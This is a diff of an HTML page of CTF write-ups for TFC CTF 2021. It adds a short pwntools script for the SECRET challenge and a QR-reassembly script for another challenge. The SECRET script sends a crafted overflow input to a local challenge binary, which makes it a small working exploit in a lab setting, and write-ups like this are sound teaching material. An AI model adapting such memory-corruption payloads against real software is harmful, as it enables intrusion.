@@ -13,17 +13,18 @@
 <nav class="navigation" id="mainNav">
 	<h2 style="text-align: center;">TFC CTF 2021</h2>
 	<h4 style="text-align: center;">My discord: R4v3N#7482</h4><br>
-	<a class="navigation__link" href="#1">JUMPY(Pwn)</a>
-	<a class="navigation__link" href="#2">SECRET(Pwn)</a>
-	<a class="navigation__link" href="#3">SANTA(Pwn)</a>
-	<a class="navigation__link" href="#4">HEAPS DON'T LIE(Pwn)</a>
-	<a class="navigation__link" href="#5">PIXEL ART(Pwn)</a>
-	<a class="navigation__link" href="#6">SEA LANGUAGE 1(Crypto)</a>
-	<a class="navigation__link" href="#7">AM I DOING IT RIGHT?(Crypto)</a>
+	<a class="navigation__link" href="#1">JUMPY (Pwn)</a>
+	<a class="navigation__link" href="#2">SECRET (Pwn)</a>
+	<a class="navigation__link" href="#3">SANTA (Pwn)</a>
+	<a class="navigation__link" href="#4">HEAPS DON'T LIE (Pwn)</a>
+	<a class="navigation__link" href="#5">PIXEL ART (Pwn)</a>
+	<a class="navigation__link" href="#6">WEIRD FRIEND (MISC)</a>
+	<a class="navigation__link" href="#7">SEA LANGUAGE 1 (Crypto)</a>
+	<a class="navigation__link" href="#8">AM I DOING IT RIGHT? (Crypto)</a>
 </nav>
 
 <div class="page-section hero" id="1">
-	<h2>JUMPY(Pwn)</h2>
+	<h2>JUMPY (Pwn)</h2>
 	File: <a href="datas/jumpy" style="color:#3d3d3d;">here</a>
 	<p>Output of checksec<br><br>
 	$checksec jumpy</p>
@@ -68,11 +69,24 @@
 	<img src="datas/flag.png">
 </div>
 <div class="page-section" id="2">
-			<h2>SECRET(Pwn)</h2>
-	
+	<h2>SECRET (Pwn)</h2>
+	File: <a href="datas/secret" style="color:#3d3d3d;">here</a><br><br>
+	<img src="datas/csecret.png"><br><br>
+	<pre>
+	<code class="language-python">
+  	from pwn import *
+
+	sh = process("./secret")
+	print(sh.recv().decode())
+	sh.sendline(p32(0xaabbccdd)*2)
+	print(sh.recvall().decode())
+	</code>
+	</pre>
+	<p>Output</p>
+	<img src="datas/outsecret.png"><br><br>
 </div>
 <div class="page-section" id="3">
-	<h2>SANTA(Pwn)</h2>
+	<h2>SANTA (Pwn)</h2>
 	File: <a href="datas/santa" style="color:#3d3d3d;">here</a>
 	<p>Output of checksec<br><br>
 	$checksec santa</p>
@@ -137,16 +151,36 @@
 	</pre>
 </div>
 <div class="page-section" id="4">
-			<h2>HEAPS DON'T LIE(Pwn)</h2>
+			<h2>HEAPS DON'T LIE (Pwn)</h2>
 </div>
 <div class="page-section" id="5">
-			<h2>PIXEL ART(Pwn)</h2>
+			<h2>PIXEL ART (Pwn)</h2>
 </div>
 <div class="page-section" id="6">
-			<h2>SEA LANGUAGE 1(Crypto)</h2>
+	<h2>WEIRD FRIEND (MISC)</h2>
+	File: <a href="datas/weird_friend.txt" style="color:#3d3d3d;">here</a><br><br>
+	I use <a href="https://github.com/waidotto/strong-qr-decoder" style="color:#3d3d3d;"  target="_blank">strong-qr-decoder</a>.
+	<pre>
+	<code class="language-python">
+	c = open("weird_friend.txt").read().strip()
+	flag,out = ('','')
+	for i in c:
+		flag += i
+		if len(flag) == 29:
+			out += flag+"\n"
+			flag=""
+			
+	open("qr.txt","w").write(out)
+	</code>
+	</pre>
+	Output:<br><br>
+	<img src="datas/outqrd.png"><br>
 </div>
 <div class="page-section" id="7">
-	<h2>AM I DOING IT RIGHT?(Crypto)</h2>
+			<h2>SEA LANGUAGE 1 (Crypto)</h2>
+</div>
+<div class="page-section" id="8">
+	<h2>AM I DOING IT RIGHT? (Crypto)</h2>
 	File: <a href="datas/AM_I_DOING_IT_RIGHT.zip" style="color:#3d3d3d;">here</a><br><br>
 	Premierly, I wanted to use RSACTFTOOL to find D but it did not work.<br><br>
 	<img src="datas/findD.png"><br><br>
